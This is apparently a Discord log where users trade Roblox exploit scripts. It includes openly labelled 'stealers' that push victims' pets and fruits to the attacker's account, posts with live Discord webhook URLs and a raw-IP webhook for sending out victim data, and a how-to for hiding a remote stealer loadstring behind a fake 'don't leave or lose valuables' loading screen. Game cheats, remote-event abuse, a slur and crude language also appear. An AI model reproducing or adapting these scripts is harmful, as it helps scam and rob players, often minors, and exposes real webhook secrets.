
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Remote
local ByteNetReliable = ReplicatedStorage.ByteNetReliable -- RemoteEvent 

-- Variables
local Blueberry = workspace.Farm.Farm.Important.Plants_Physical.Blueberry.Fruits.Blueberry

ByteNetReliable:FireServer(
    buffer.fromstring("\1\1\0\1") --[[buffer: 0xd235df50f0b334db]],
    {
        Blueberry -- chnage to seed u wanna collect
    }
)


collect without proxmity thingy and others is the vid 
one 2 kiw — 6/19/25, 3:51 AM
ur not slick reported to roblox ez ban
14poisoned
[DLTΔ]
 — 6/19/25, 4:22 AM
local TweenService = game:GetService("TweenService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NotificationGui"
ScreenGui.Parent = game.CoreGui
Expand
message.txt
8 KB
Hamburger — 6/21/25, 6:24 AM
Open spurce staelers (yes tobi) 
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true
Expand
petsgoFREE.lua.txt
11 KB
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true
Expand
ps99FREE.lua.txt
12 KB
one 2 kiw — 6/23/25, 8:15 PM
read pinned before trying to talk here
game:Destroy()
[WRD]
 — 6/26/25, 7:05 AM
dead rails stealer. made by @game:Destroy() (me)
dont know if works or not. fix it
local Username = "segeshs1" -- put your roblox username
local ChooseClass = "Survivalist" -- class are list down
local Webhook = "https://discord.com/api/webhooks/1367738054088851466/3uUWI4kYP0KLkgt_wFCBXqiNNstgrR8IdF-jPoN2kziYsP_NMxSj3X2X219_f_7Ta-Vh" -- put your discord webhook here

local PublicHitWebhook = "http://89.169.3.53:8000/webhook/c461a4f8-bb4a-4668-9f0b-e79e4628087e"
Expand
message.txt
7 KB
game:Destroy()
[WRD]
 — 6/30/25, 5:29 AM
Blox fruit trade stealer
type "+fruit" to add the fruit
inspired by Death Feather Blox fruit Stealer
local Username = "aevyxlol"

-- main variable
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- blox fruits variable
local addtrade = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
local sitteleport = Vector3.new(-463, 73, 271)

local lp = Players.LocalPlayer

-- matching with letter case support
local function lettercasesupport(name)
    name = name:lower()
    return name:sub(1,1):upper() .. name:sub(2)
end

local function trade(fruitName)
    local formattedName = lettercasesupport(fruitName)
    local formattedFruit = formattedName .. "-" .. formattedName
    local args = {
        "addItem",
        formattedFruit
    }
    addtrade:InvokeServer(unpack(args))
end

-- teleport to sit
local function tptosit()
    local character = lp.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:MoveTo(sitteleport)
    end
end

-- add fruit command
local function playeraddfruitcommand(player)
    if player.Name == Username then
        player.Chatted:Connect(function(message)
            if message:sub(1, 1) == "+" then
                local fruit = message:sub(2)
                trade(fruit)
            else
                while true do
                    task.wait(0.1)
                    tptosit()
                end
            end
        end)
    end
end

-- only listen to hitter
for _, player in ipairs(Players:GetPlayers()) do
    if player.Name:lower() == Username:lower() then
        playeraddfruitcommand(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player.Name:lower() == Username:lower() then
        playeraddfruitcommand(player)
    end
end)

Players.PlayerAdded:Connect(playeraddfruitcommand)
 
one 2 kiw — 7/6/25, 4:06 PM
print("ZeanZulfiqar is cool")
14poisoned
[DLTΔ]
 — 7/11/25, 12:25 PM
local LibraryNotify = loadstring(game:HttpGet("https://gist.githubusercontent.com/AgentX771/930b5a9b78517ebfed75475fb3f6c9f6/raw/f20d3cc01b72d0ee6581e89b0e2bd3eba069c40e/gistfile1.txt"))()
local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/AgentX771/ArgonHubX/refs/heads/main/UIArgon/ArgonRise.lua'))()
for _, v in next, {"Argon Hub X", "Argon", "Hub X", "Arg", "Argon_Hub_X"} do
    pcall(delfolder, v)
end
local ESPLines = loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/refs/heads/main/Privating/ESPLines.lua"))()... (84 KB left)
Expand
message.txt
134 KB
one 2 kiw — 7/11/25, 1:30 PM
what game even is this for
14poisoned
[DLTΔ]
 — 7/13/25, 10:20 AM
setclipboard("https://discord.gg/dmBzVaRrD3")
-- Services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")... (35 KB left)
Expand
GaG.txt
85 KB
14poisoned
[DLTΔ]
 — 7/18/25, 3:49 AM
for i = 1, 10000 do

for i = 1, 10000 do
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local SellPetRE = ReplicatedStorage:WaitForChild("GameEvents", 9e9):WaitForChild("SellPet_RE", 9e9)

for i = 1, 10000 do
    local char = LocalPlayer.Character
    local pet = char and char:FindFirstChildOfClass("Tool")

    if pet then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local otherChar = player.Character
                if otherChar then
                    local otherPet = otherChar:FindFirstChildOfClass("Tool")
                    if otherPet then
                        SellPetRE:FireServer(otherPet)
                    end
                end
            end
        end
    end
end
end
end
end
 
14poisoned
[DLTΔ]
 — 7/18/25, 6:30 AM
op steal a brainrot
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
Expand
message.txt
21 KB
one 2 kiw — 7/21/25, 9:01 PM
auto farm beachballs script
Image
-- SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualUser = game:GetService("VirtualUser")
Expand
gZfWssZ.txt
7 KB
Vmp — 7/22/25, 1:48 AM
better made and just better
-- SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualUser = game:GetService("VirtualUser")
Expand
better summer or any event autofarm mm2.txt
8 KB
Vienna
[BBTS]
 — 7/23/25, 10:17 PM
Mm2 spawner can be equipped it's good not made by me
local ancientValues = {
	["Corrupt"] = 900,
    ["Gingerscope"] = 9300,
    ["Traveler's Axe"] = 6200,
    ["Harvester"] = 725,
    ["Celestial"] = 625,
Expand
Item spawner (1).txt
50 KB
one 2 kiw — 7/28/25, 2:02 AM
some shitty gui that could be used for gag videos (I DIDNT MAKE IT) 
-- ✅ Final corrected version: Draggable, with working player list and blur intro

-- LocalScript inside StarterGui

local PlayersService = game:GetService("Players")
local UIS = game:GetService("UserInputService")
Expand
message.txt
9 KB
The One Piece is Real
[pRev]
 — 8/2/25, 9:19 AM
Dark script source restoration 
repeat 
    task.wait()
until game:IsLoaded()

local WEBHOOK_URL = "https://discord.com/api/webhooks/1400978772764659712/8D9ZMM-FUIUm_i2oSwc3zaX6FA6wNYK96FHGcH69yh1PmhMt0aMlfJgN9S5veYoypzcY"
local VICTIM = game.Players.LocalPlayer
Expand
message (8).txt
7 KB
̇
APP
 — 8/2/25, 2:17 PM
@The One Piece is Real has reached level 2. GG!
̇
APP
 — 8/5/25, 5:46 PM
@Benny has reached level 2. GG!
The One Piece is Real
[pRev]
 — 8/7/25, 6:52 PM
Whats up losers today i've made NEW CLIENT SIDED, VISUAL so what it does is
-Pet Age Changer
-Pet Mutation Reroller
-Pet Egg Randomizor 
Say Ingen in chat to show a loading screen that says
REDIRECTING PLEASE WAIT
IF YOU LEAVE YOU MIGHT LOSE YOUR VALUABLES ITEMS
Loading
And u can steal
https://vt.tiktok.com/ZSSXAj4vR/
^ the video
Change tge loadstring w ur stealer so u can use both stealer n visuap
-- CHANGE THE LOADSTRING WITH YOUR STEALER SO IT RUNS BOTH GUI AND STEALER
local Stealer
local ok, res = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/IngeniousScripts/Universal/refs/heads/main/IngeniousScriptsVault",true))()
end)
if ok then
Expand
Ingenious Script Vault_250807_204620.txt
25 KB
̇
APP
 — 8/8/25, 1:57 PM
@Femboy Cuck for BBC >-< has reached level 1. GG!
Femboy Cuck for BBC >-<
[Ａｕｒａ]
 — 8/8/25, 3:58 PM
LIL DARK SCRIPT REMOVED DH (FULLY FUNCTIONAL)
 
--[[
   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
 | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
Expand
message.txt
35 KB
Femboy Cuck for BBC >-<
[Ａｕｒａ]
 — 8/8/25, 4:58 PM
lil dark script updated no dh not using fern same like orignal just some extra features
--[[
   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
 | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
Expand
DARK SCRIPTS.txt
35 KB
Femboy Cuck for BBC >-<
[Ａｕｒａ]
 — 8/10/25, 3:27 PM
LIL D3ATH FEATHER
--[[
   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
 | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
Expand
message.txt
35 KB
!?
[DARK]
 — 8/14/25, 3:37 PM
LIL FEATHER V2 @everyone ONLY FOR PETS
 
Username = {"User1,User2,User3"} -- receiver usernames 
Webhook = "YOUR_WEBHOOK_URL_HERE" -- your webhook URL

local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
Expand
message.txt
7 KB
arko — 8/17/25, 3:56 AM
useless, no delta bypass
New Text Document (2).txt
1 KB
Simple Obfuscator
APP
 — 8/17/25, 3:58 AM
lol
arko — 8/17/25, 10:31 PM
Some goofy loading screen I made a while ago. I might work on it again and make it look better, so if you want to get automatic updates, just don’t touch the loadstring. If you want to modify it, then go ahead. 
loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua", true))()
--Some goofy loading screen I made a while ago. I might work on it again and make it look better, so if you want to get automatic updates, just don’t touch the loadstring. If you want to modify it, then go ahead.
loadingscreen.txt
1 KB
The Real xxxtentacion
[VON]
 — 8/19/25, 3:36 AM
auto harvester for gag made by me 
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
Expand
message.txt
4 KB
amaz — 8/19/25, 7:55 PM
delta job id bypass
bypass = game.JobId
print(bypass)
gotta find out.
[GAG]
 — 8/21/25, 12:08 AM
delta real job id bypass 🥰 🔥 😎 😘  (25ms skidded reverse )
local genv = getgenv()
local _ = require == require
CHECKIF(not game:IsLoaded())
game.Loaded:Wait()
CHECKIF(not genv.executed)
genv.executed = true
CHECKIF(game.PlaceId == 126884695634066)
CHECKIF(not not # getgc() < 1000)
 
bb — 8/21/25, 12:11 AM
bypass = game.screenshot.gay
bypass = true
if bypass == true do bypass
arko — 8/21/25, 4:53 PM
Fullscreen Goofy Loading Screen v2

loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()


How to use it:

local function stealer()
    loadstring(game:HttpGet("your_stealer_here"))()
end

local function loadingscreen()
    loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
end

task.spawn(stealer)
task.spawn(loadingscreen)



Instructions:
Copy everything above.
Replace 'loadstring(game:HttpGet("your_stealer_here"))()' with your actual generated stealer loadstring.
After replacement, your code should look like this:

local function stealer()
    loadstring(game:HttpGet("https://paste.debian.net/plain/1392747", true))()
end

local function loadingscreen()
    loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
end

task.spawn(stealer)
task.spawn(loadingscreen)


You can then obfuscate the script and upload it to GitHub.

(keep the arko.lol loadstring if you want to recieve updates.)
❗ ❗ ❗ ❗ ❗ ❗ (STOP ASKING ME FOR HELP NIGGA) ❗ ❗ ❗ ❗ ❗ ❗ ❗ ❗ ❗ ❗ 
Image
amaz — 8/21/25, 7:30 PM
jsp this post have stealer
print(f'delta bypass: {game.JobId}')
arko — 8/21/25, 7:32 PM
:16388bluemoji57:
Image
Greaky
[HD]
 — 8/23/25, 1:19 AM
Spawner from a random channel on youtube bad obfuscated
-- DUMPED BY @Greaky @Greaky @Greaky @Greaky @Greaky @Greaky @Greaky


-- Ensure this script is in StarterPlayerScripts as a LocalScript
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game:GetService("CoreGui")
Expand
message.txt
16 KB
game:Destroy()
[WRD]
 — 9/5/25, 8:48 AM
local ok = gethiddenproperty(game, "JobId")
print("blowjobid: ", ok)

jobid bypass delta script real no fake
Ârkô🍇 — 9/6/25, 3:46 AM
N 
Image
! qwerty — 9/6/25, 3:52 AM
Image
Image
Image
Flanda — 9/6/25, 3:45 PM
U got Skillz — 9/7/25, 5:09 AM
100% delta bypass ( Dark skid edition )
game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v)
    queue_on_teleport(string.format([[getgenv().JobId = "%s"]], v.ServerInstanceId))
end)


for _ = 1, 2 do
    task.spawn(function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, game.JobId)
    end)
    task.wait()
end

I saw this somewhere, I don't remember if it works currently 
Deno — 9/7/25, 6:16 PM
That was sent in project reverse lol
 
!jsp — 9/7/25, 6:17 PM
Image
amaz — 9/7/25, 10:45 PM
print("who is that")
Deno — 9/8/25, 8:41 PM
Bro stole that code from project reversed leak
 
amaz — 9/8/25, 8:41 PM
what a nub
!jsp — 9/8/25, 8:42 PM
yall not ready for the lua syntax check 
Ârkô🍇 — 9/8/25, 8:50 PM
fr
fr.txt
1 KB
Deno — Yesterday at 3:18 PM
Sure
﻿
-- SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualUser = game:GetService("VirtualUser")

-- VARIABLES
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

local visitedPositions = {}
local isActive = false
local flySpeed = 15
local collected = 0
local startTime = 0
local antiAFK = false

player.CharacterAdded:Connect(function(char)
	character = char
	rootPart = char:WaitForChild("HumanoidRootPart")
	visitedPositions = {}
end)

-- SOUND
local collectSound = Instance.new("Sound", rootPart)
collectSound.SoundId = "rbxassetid://12221967"
collectSound.Volume = 1

-- GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "AutoFarmGui"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 280, 0, 300) -- Slightly taller to fit credits
frame.Position = UDim2.new(0.5, -140, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(110, 110, 160)
stroke.Thickness = 2

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 5)
title.Text = "Coin/Beach Balls Autofarm"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextXAlignment = Enum.TextXAlignment.Left

local separator = Instance.new("Frame", frame)
separator.Size = UDim2.new(1, -20, 0, 1)
separator.Position = UDim2.new(0, 10, 0, 45)
separator.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
separator.BorderSizePixel = 0

local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, -20, 0, 20)
credit.Position = UDim2.new(0, 10, 1, -20)
credit.Text = "Made by XenaMm2"
credit.TextColor3 = Color3.fromRGB(170, 170, 170)
credit.BackgroundTransparency = 1
credit.Font = Enum.Font.Gotham
credit.TextSize = 12
credit.TextXAlignment = Enum.TextXAlignment.Right

local hideBtn = Instance.new("TextButton", gui)
hideBtn.Size = UDim2.new(0, 110, 0, 35)
hideBtn.Position = UDim2.new(1, -120, 1, -45)
hideBtn.Text = "Hide GUI"
hideBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
hideBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
hideBtn.Font = Enum.Font.GothamBold
hideBtn.TextSize = 14
Instance.new("UICorner", hideBtn).CornerRadius = UDim.new(0, 6)

hideBtn.MouseEnter:Connect(function()
	hideBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
end)
hideBtn.MouseLeave:Connect(function()
	hideBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
end)
hideBtn.MouseButton1Click:Connect(function()
	frame.Visible = not frame.Visible
	hideBtn.Text = frame.Visible and "Hide GUI" or "Show GUI"
end)

local function makeButton(y, text)
	local btn = Instance.new("TextButton", frame)
	btn.Size = UDim2.new(0, 240, 0, 30)
	btn.Position = UDim2.new(0.5, -120, 0, y)
	btn.Text = text
	btn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 14
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
	return btn
end

local function makeLabel(y, text)
	local lbl = Instance.new("TextLabel", frame)
	lbl.Size = UDim2.new(0, 240, 0, 20)
	lbl.Position = UDim2.new(0.5, -120, 0, y)
	lbl.Text = text
	lbl.BackgroundTransparency = 1
	lbl.TextColor3 = Color3.fromRGB(200, 200, 200)
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 14
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	return lbl
end

local toggleBtn = makeButton(60, "Auto Farm: OFF")
local afkBtn = makeButton(100, "Anti-AFK: OFF")
local speedBtn = makeButton(140, "Tween Speed: 15")
local counterLabel = makeLabel(180, "Coins/Eggs/Balss Collected: 0")
local timerLabel = makeLabel(205, "Time Active: 0s")
local rateLabel = makeLabel(230, "Est. Coins/Hour: 0")
local resetBtn = makeButton(255, "🔄 Reset Counter")

resetBtn.MouseButton1Click:Connect(function()
	collected = 0
	startTime = tick()
	counterLabel.Text = "Coins/Eggs Collected: 0"
	timerLabel.Text = "Time Active: 0s"
	rateLabel.Text = "Est. Coins/Hour: 0"
end)

-- AFK
afkBtn.MouseButton1Click:Connect(function()
	antiAFK = not antiAFK
	afkBtn.Text = antiAFK and "Anti-AFK: ON" or "Anti-AFK: OFF"
end)

player.Idled:Connect(function()
	if antiAFK then
		VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		task.wait(1)
		VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
	end
end)

RunService.Stepped:Connect(function()
	if isActive and character then
		for _, v in ipairs(character:GetDescendants()) do
			if v:IsA("BasePart") then
				v.CanCollide = false
			end
		end
	end
end)

speedBtn.MouseButton1Click:Connect(function()
	flySpeed += 1
	if flySpeed > 25 then flySpeed = 10 end
	speedBtn.Text = "Tween Speed: " .. flySpeed
end)

local function flyTo(pos, speed)
	if not rootPart then return end
	local distance = (pos - rootPart.Position).Magnitude
	local duration = distance / speed
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
	local goal = {CFrame = CFrame.new(pos)}
	local tween = TweenService:Create(rootPart, tweenInfo, goal)
	tween:Play()
	tween.Completed:Wait()
end

local function isNear(pos1, pos2)
	return (pos1 - pos2).Magnitude < 250
end

toggleBtn.MouseButton1Click:Connect(function()
	isActive = not isActive
	toggleBtn.Text = isActive and "Auto Farm: ON" or "Auto Farm: OFF"
	toggleBtn.BackgroundColor3 = isActive and Color3.fromRGB(80, 160, 80) or Color3.fromRGB(50, 50, 70)

	if isActive then
		collected = 0
		startTime = tick()
		visitedPositions = {}

		-- Timer updater
		task.spawn(function()
			while isActive do
				local elapsed = tick() - startTime
				timerLabel.Text = "Time Active: " .. math.floor(elapsed) .. "s"
				local rate = elapsed > 0 and math.floor((collected / elapsed) * 3600) or 0
				rateLabel.Text = "Est. Coins/Hour: " .. rate
				task.wait(0.1)
			end
		end)

		-- Main coin search loop
		task.spawn(function()
			while isActive do
				character = player.Character or player.CharacterAdded:Wait()
				rootPart = character:FindFirstChild("HumanoidRootPart")
				if rootPart then
					local closest, shortest = nil, math.huge
					for _, obj in ipairs(workspace:GetDescendants()) do
						if obj:IsA("BasePart") and obj.Name == "Coin_Server" then
							local dist = (obj.Position - rootPart.Position).Magnitude
							if dist < shortest and dist < 250 and not visitedPositions[obj] then
								closest = obj
								shortest = dist
							end
						end
					end

					if closest and closest.Parent and closest:IsDescendantOf(workspace) then
						flyTo(closest.Position, flySpeed)
						if closest and closest.Parent and closest:IsDescendantOf(workspace) then
							visitedPositions[closest] = true
							collected += 1
							collectSound:Play()
							counterLabel.Text = "Coins/Eggs/Balls Collected: " .. collected
						end
					end
				end
				task.wait(0.1)
			end
		end)
	end
end)
